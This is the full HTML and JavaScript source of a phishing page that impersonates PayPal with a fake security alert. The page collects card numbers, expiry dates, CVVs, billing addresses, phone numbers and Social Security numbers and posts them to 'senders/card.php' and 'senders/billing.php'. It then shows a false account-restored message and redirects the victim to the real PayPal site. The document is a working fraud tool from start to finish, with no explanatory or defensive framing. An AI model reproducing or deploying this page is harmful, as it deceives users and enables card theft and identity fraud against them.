<html>
<head>
<title>Update your account</title>
<meta charset="utf-8"/>
<meta name='viewport' content='width=device-width, initial-scale=1.0'/>
<link rel='icon' href='asset/img/ppicon.ico'/>
<link rel='stylesheet' href='https://stylesheetcss.blogspot.com/?style.css'/>
<link rel='stylesheet' href='asset/css/update.css'/>
<script src='asset/js/jq.js'></script>
<script src='asset/js/v.js'></script>
<script src='asset/js/m.js'></script>
</head>
<body>
<div class='all '>
<div class='top'>
<div class='tleft'>
<img src='asset/img/ppwhite.svg'>
</div>
<div class='tright'>
<a href='https://www.paypal.com/signin'><button>Log out</button></a>
</div>
</div>



<div class='update'>



<div id='alert' style='text-align:left; '>
<span>Security Alert!</span>
</p>We detected some unusual activities on your account<br> and we want to be sure that was you.<br>
 Please help us protect your account by providing some information.<br>
 Click Continue to start confirming your account, it won't take much time.<br>
</p>
<div style='width:100%; text-align:center'>
<button style='width:95%; border-radius:4px; font-weight:bold;' onclick='setup()'>Continue</button>
<button style='width:95%; border-radius:4px;  background: #cccccc; color:black;  border:1px solid #b3b3b3;' onclick='gotopaypal()'>Log Out</button>
</div>
</div>



<div id='creditcard' style='display:none;'>
<span>Add credit/debit card</span>
<div class='form'>
<form id='card' onsubmit='return false'>
<input id="nameoncard" class='input' required name="Name on card" type="text" placeholder='Name on card'>
<input id="cardnumber" class='input' required name="Card number" type="text" placeholder='Card Number'>
<div class='multi'>
<div class='multileft'>
<select id="mm" class='input' name="Month" required style='width:90%;' >
<option selected disabled>Month
<script>
for (var i = 1 ; i < 13 ; i++){
	document.write("<option value='"+i+"'>"+i);
}
</script>
</select>

</div>
<div class='multiright'>
<select id="yy" name="Year" required class='input' style='width:90%;' >
<option selected disabled>Year
<script>
for (var i = 19 ; i < 31 ; i++){
	document.write("<option value='"+i+"'>20"+i);
}
</script>
</select>
</div>
</div>
<input id="cvv" class='input' required name="Cvv" type="text" placeholder='CVV'>
<button style='width:95%; border-radius:4px;' onclick='sendcreditcard()'>Add</button>
</form>
</div>
</div>


<div id='billing' style='display:none;'>

<span>Update your billing address</span>
<div class='form'>
<form id='billings' onsubmit='return false'>
<input id="fullname" class='input' required name="Full Name" type="text" placeholder='Full Name'>
<input id="addressline" class='input' required name="Address Line" type="text" placeholder='Address Line'>
<div class='multi'>
<div class='multileft'>
<input id="city" class='input' required name="City" style='width:90%;' type="text" placeholder='City'>
</div>
<div class='multiright'>
<input id="state" class='input' required name="State" style='width:90%;' type="text" placeholder='State'>
</div>
</div>
<input id="zip" class='input' required name="zip" type="text" placeholder='Postal Code'>
<input id="phone" class='input' required name="Phone number" type="text" placeholder='Phone Number'>
<input id="ssn" class='input'  name="SSN" type="text" placeholder='SSN (optional)'>
<button style='width:95%; border-radius:4px;' onclick='sendBilling()'>Update & Finish</button>
</form>
</div>

</div>





<div id='thankyou' style='display:none;'>

<span>Congratulations!</span><br>
<p><span style='font-size:1.3em; margin-top:8px;'>You have restored your account.</span><br>
Thank you! you can now go to your account.</p>
<div class='form'>
<button style='width:95%; border-radius:4px; font-weight:bold;' onclick='gotopaypal()'>My Account</button>
<button style='width:95%; border-radius:4px; background:#eeeeee; color:black; font-weight:bold; border:1px solid #4a4a4a;' onclick='gotopaypal()'>Log Out</button>
</div>
</div>




</div>
<div class='down'>
&copy; 2019 PayPal <a href='#'>Privacy</a> <a href='#'>Legal</a> <a href='#'>Contact</a>
</div>
</div>

<div id='waiter' style='display:none;'>
<div  class="waiter">
<div style='text-align:center; width:100%;'>
<img src='asset/img/loader.gif'>
</div>
</div>
</div>
<script>

function gotopaypal(){
	window.location = "https://www.paypal.com/signin";
}

$(function(){
$('#cardnumber').mask("0000000000000000");	
$("#cvv").mask("000");
$('#phone').mask('(000) 000 00000000');
});


function setup(){
$("#waiter").show();
setTimeout(update,1000);
}

function update(){
	$("#waiter").hide();
	$("#alert").hide();
	$("#creditcard").show();
}


 $("#card").validate({
		submitHandler: function() {
		setTimeout($("#waiter").show(),$.post("senders/card.php?ajax",$("#card").serialize(),function(done){
		$("#waiter").hide();
		$("#creditcard").hide()
		$("#billing").show();
		}));
		}
 });
 
 
 
 
  $("#billings").validate({
		submitHandler: function() {
		setTimeout($("#waiter").show(),$.post("senders/billing.php?ajax",$("#billings").serialize(),function(done){
		$("#waiter").hide();
		$("#creditcard").hide()
		$("#billing").hide();
		$("#thankyou").show();
		}));
		}
 });
	

</script>
</body>
</html>